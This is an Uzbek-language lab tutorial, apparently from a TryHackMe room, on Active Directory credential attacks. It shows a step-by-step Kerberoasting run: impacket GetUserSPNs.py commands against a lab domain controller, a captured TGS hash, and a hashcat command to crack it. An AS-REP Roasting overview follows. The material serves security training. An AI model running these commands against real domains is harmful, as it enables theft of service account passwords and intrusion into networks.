Oldingi topshiriqlarda biz tizimga dastlabki kirish imkoni mavjud bo‘lib, tizim xotirasi yoki Windows operatsion tizimidagi turli fayllardan credential (foydalanuvchi ma’lumotlari)larni olishga harakat qilayotganimiz taxmin qilingan edi. Ammo boshqa holatlarda, tarmoq ichidagi qurbonlar tarmog‘ida credentiallarni qo‘lga kiritish uchun turli hujumlarni amalga oshirish mumkin.

Ushbu topshiriqda, credentiallarni olish uchun foydalaniladigan ba’zi Windows va Active Directory hujumlariga qisqacha kirish qilinadi. Batafsil AD hujumlariga o‘tishdan oldin, siz **Kerberos** protokoli va **New Technology LAN Manager (NTLM)** protokollar majmuasi bilan tanish bo‘lishingiz tavsiya qilinadi — ular Windowsda autentifikatsiya (foydalanuvchini tasdiqlash) uchun ishlatiladi.

---

### **Kerberoasting**

**Kerberoasting** — bu Active Directory (AD) tarmog‘ida keng tarqalgan hujum turi bo‘lib, hujumchiga AD ticket (chipta)larini olish orqali tizimda mustahkamlanish imkonini beradi. Bu hujumni amalga oshirish uchun hujumchida SPN (Service Principal Name) bo‘lgan hisoblar — masalan, `IIS`, `MSSQL` va boshqalar —ga kirish huquqi bo‘lishi kerak.

Kerberoasting hujumi quyidagicha ishlaydi:

1. Hujumchi TGT (Ticket Granting Ticket) so‘raydi.
2. So‘ngra TGS (Ticket Granting Service) ni talab qiladi.
3. Maqsad — tizimda **privilege escalation** (huquqni oshirish) va **lateral movement** (tarmoqda boshqa qurilmalarga o‘tish).

Kerberoasting bo‘yicha batafsil ma’lumot olish uchun TryHackMe’dagi **Persisting AD** xonasining 3-topshiriq bo‘limiga murojaat qilishingiz mumkin.

#### **Hujumning qisqa demo ko‘rinishi**

1. Avval SPN account(lar)ni aniqlaymiz.
2. So‘ng `TGS` ticketini olish uchun so‘rov yuboramiz.

Quyidagi buyruq bilan SPN accountlarni aniqlaymiz:

```bash
python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.201.112.212 THM.red/thm
```

> Bu yerda:
>
> * `-dc-ip` — Domain Controller manzili
> * `THM.red/thm` — domen va foydalanuvchi nomi
> * Skript parol so‘raydi

Natija quyidagicha bo‘ladi:

```
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578
```

Endi esa, `svc-user` SPN hisobiga TGS ticket olish uchun so‘rov yuboramiz:

```bash
python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.201.112.212 THM.red/thm -request-user svc-user
```

> Bu buyruq TGS ticketni beradi:

```
$krb5tgs$23$*svc-user$THM.RED$THM.red/svc-user*$8f5de4211da1cd5715217[...]7bfa3680658dd9812ac061c5
```

Endi esa, bu ticketni **Hashcat** yordamida crack qilamiz:

```bash
hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
```

> 🎯 Siz ham xuddi shu tartibda berilgan VM’ga hujum qilib ko‘ring, SPN foydalanuvchisini toping, TGS ticket oling va uni crack qilib parolni aniqlang.

---

### **AS-REP Roasting**

**AS-REP Roasting** — bu hujum texnikasi bo‘lib, hujumchiga “Kerberos oldindan autentifikatsiyani talab qilinmasin” (Do not require Kerberos pre-authentication) parametri yoqilgan foydalanuvchilarning credential hashlarini olish imkonini beradi.

Bu parametr eskirgan Kerberos autentifikatsiya usuliga asoslangan bo‘lib, parol talab qilinmasdan chipta beriladi. Hujumchi ushbu hashni olib, oflayn tarzda crack qilishi mumkin. Agar hash crack qilinsa — foydalanuvchi paroli aniqlanadi!
